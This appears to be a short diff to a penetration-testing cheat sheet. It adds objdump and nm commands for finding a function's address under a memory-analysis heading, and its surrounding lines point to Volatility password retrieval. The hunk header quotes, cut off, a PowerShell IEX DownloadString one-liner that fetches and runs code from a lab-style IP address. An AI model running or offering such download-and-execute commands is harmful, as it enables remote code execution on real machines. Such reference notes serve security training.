@@ -1590,6 +1590,12 @@ powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14
 ```
 
 # Memory Analysis
+## Get Function Address
+```
+objdump -d my.exe | grep func1
+nm -A my.exe | grep func1
+```
+
 ## .dmp file
 * see https://www.aldeid.com/wiki/Volatility/Retrieve-password
 * install volatility
